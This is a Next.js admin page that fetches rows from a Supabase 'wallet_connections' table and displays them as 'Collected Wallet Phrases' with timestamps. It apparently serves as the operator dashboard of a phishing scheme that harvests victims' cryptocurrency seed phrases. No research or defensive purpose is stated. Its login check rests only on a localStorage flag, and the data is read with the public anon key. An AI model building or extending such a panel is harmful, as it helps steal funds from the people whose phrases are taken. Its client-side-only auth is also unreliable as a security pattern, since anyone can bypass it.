'use client';

import { useEffect, useState } from 'react';
import { createClient } from '@supabase/supabase-js';
import { useRouter } from 'next/navigation'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

const AdminPage = () => {
  const [phrases, setPhrases] = useState<{ id: string; phrase: string; created_at: string }[]>([]);

  const router = useRouter()
  const [isAuthenticated, setIsAuthenticated] = useState(false)

  useEffect(() => {
    // Check if logged in
    const loggedIn = localStorage.getItem("isLoggedIn") === "true"

    if (!loggedIn) {
      // Redirect to login if not logged in
      router.push("/login")
    } else {
      setIsAuthenticated(true)
    }
  }, [router])

  const handleLogout = () => {
    // Clear login status
    localStorage.removeItem("isLoggedIn")

    // Redirect to login
    router.push("/login")
  }


  useEffect(() => {
    const fetchPhrases = async () => {
      const { data, error } = await supabase
        .from('wallet_connections')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) console.error(error.message);
      else setPhrases(data || []);
    };

    fetchPhrases();
  }, []);

  
  // Don't render anything until we've checked authentication
  if (!isAuthenticated) {
    return null
  }

  return (
    <div className="p-6 pt-40 max-w-4xl mx-auto">
      <div className='md:flex md:justify-between md:w-full mb-4'>
      <h1 className="text-2xl font-bold ">Collected Wallet Phrases</h1>
      <button
        onClick={handleLogout}
        className="px-4 py-2 bg-red-500 text-white rounded"
      >
        Logout
      </button>
      </div>
      <ul className="space-y-4">
        {phrases.map(({ id, phrase, created_at }) => (
          <li key={id} className="p-4 border rounded bg-white shadow">
            <p className="text-gray-800">{phrase}</p>
            <p className="text-sm text-gray-500">{new Date(created_at).toLocaleString()}</p>
          </li>
        ))}
      </ul>
    </div>
  );
};

export default AdminPage;